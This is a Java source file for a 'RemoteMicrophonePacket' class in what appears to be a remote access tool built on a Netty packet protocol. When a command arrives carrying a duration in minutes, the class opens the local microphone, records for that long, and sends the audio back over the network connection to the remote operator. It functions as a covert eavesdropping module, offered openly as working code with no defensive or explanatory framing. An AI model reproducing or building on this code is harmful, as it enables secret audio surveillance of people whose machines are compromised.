/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.protocol.packets.impl;

import com.protocol.packets.Packet;
import com.protocol.packets.PacketType;
import com.protocol.packets.Packets;
import com.ctx.client.ChannelHandler;
import io.netty.buffer.ByteBuf;
import io.netty.channel.ChannelHandlerContext;
import java.io.ByteArrayOutputStream;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.TargetDataLine;
import lombok.Getter;
import lombok.Setter;
import lombok.extern.slf4j.Slf4j;

@Slf4j
public class RemoteMicrophonePacket implements Packet 
{
    private final float sampleRate = 16000.0F;
    private final int sampleSizeBits = 16;
    private final int channels = 1;
    private final boolean signed = true;
    private final boolean bigEndian = false;
    private final AudioFormat format = new AudioFormat(sampleRate, sampleSizeBits, channels, signed, bigEndian);
    
    private byte[] audioData = null;
    
    @Getter
    private static TargetDataLine audioLine;
    
    @Setter
    private static boolean isCanceled;
    
    @Override
    public int getOpcode() 
    {
        return Packets.REMOTE_MICROPHONE_PACKET.getCode();
    }

    @Override
    public String getDescription() 
    {
        return Packets.REMOTE_MICROPHONE_PACKET.getDescription();
    }

    @Override
    public PacketType getPacketType() 
    {
        return Packets.REMOTE_MICROPHONE_PACKET.getPacketType();
    }

    @Override
    public void read(ChannelHandlerContext chc, ByteBuf in) throws Exception 
    {
         isCanceled = false;
         
         initDataLine();
         
        int captureTime = in.readInt();
        log.info("Capturing microphone for: {} minutes", captureTime);

        long startTime = System.currentTimeMillis();
        byte[] buffer = new byte[4096];
        int bytesRead = 0;
        ByteArrayOutputStream recordBytes = new ByteArrayOutputStream();
        while (!isCanceled && elapsedTime(startTime) < captureTime * 60)
        {
            System.out.println("Capturing microphone elapsed time: " + elapsedTime(startTime));
            bytesRead = audioLine.read(buffer, 0, buffer.length);
            recordBytes.write(buffer, 0, bytesRead);
            audioData = recordBytes.toByteArray();
        }
         ChannelHandler.writePacket(this);
    }
    
    @Override
    public void write(ChannelHandlerContext chc, ByteBuf out) throws Exception 
    {
                out.writeBytes(audioData, 0, audioData.length);
    }
    
    /**
     * Elapsed time in seconds
     *
     * @param start
     * @return elapsed time in seconds
     */
    public long elapsedTime(long start) 
    {
        //long startTime = System.currentTimeMillis();
        long now = System.currentTimeMillis();
        return (now - start) / 1000;
    }
        
    /**
     * Initialize the dataLine
     *
     * @throws LineUnavailableException
     */
    public void initDataLine() throws LineUnavailableException 
    {
        DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);

        if (!AudioSystem.isLineSupported(info)) 
        {
            throw new LineUnavailableException("The system does not support the specified format.");
        }

        audioLine = AudioSystem.getTargetDataLine(format);
        if (audioLine.isOpen()) 
        {
            System.out.println("line already open!");
            return;
        }
        audioLine.open(format);
        audioLine.start();
    }
    
}
